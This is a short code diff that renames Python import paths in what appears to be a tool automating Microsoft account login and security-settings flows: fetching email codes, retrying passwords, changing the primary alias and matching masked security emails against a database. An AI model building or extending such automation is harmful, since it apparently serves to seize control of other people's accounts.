@@ -5,7 +5,7 @@ from urllib.parse import urljoin, unquote
 
 import httpx
 
-from securing.utils.cookies.get_email_code import get_email_code
+from authsecuring.utils.cookies.get_email_code import get_email_code
 
 _PROOFS_URL = "https://account.live.com/proofs/Manage/additional"
 _MAX_BRIDGE_HOPS = 10
@@ -46,7 +46,7 @@ def _resolve_security_email_from_masked_display(display: str) -> str | None:
         return None
 
     try:
-        from database.database import DBConnection
+        from storage.romeo_db import RomeoDB as DBConnection
 
         with DBConnection() as db:
             rows = db.get_security_emails() or ()
@@ -561,7 +561,7 @@ async def _finish_i5600_leave(
     # OAuth continue form — same hop that unblocks AddAssocId / names/manage
     if _has_auth_redirect_form(text):
         try:
-            from securing.utils.security.change_primary_alias import (
+            from authsecuring.utils.security.change_primary_alias import (
                 _submit_auth_redirect,
             )
 
@@ -652,7 +652,7 @@ async def _complete_i5600_email_otc(
             return None
         print(f"[~] - {label} — trying password on i5600…")
         try:
-            from securing.utils.login_pwd import login_pwd
+            from authsecuring.utils.login_pwd import login_pwd
 
             page = await login_pwd(session, login, url_post, password, sft)
             if not page:
@@ -870,7 +870,7 @@ async def _try_password_on_login_page(
     password: str,
 ) -> httpx.Response | None:
     """If proofs SSO bounced to i5030 login, try password once."""
-    from securing.utils.login_pwd import login_pwd
+    from authsecuring.utils.login_pwd import login_pwd
 
     url_post, sft = _extract_url_post_sft(text)
     if not url_post or not sft:
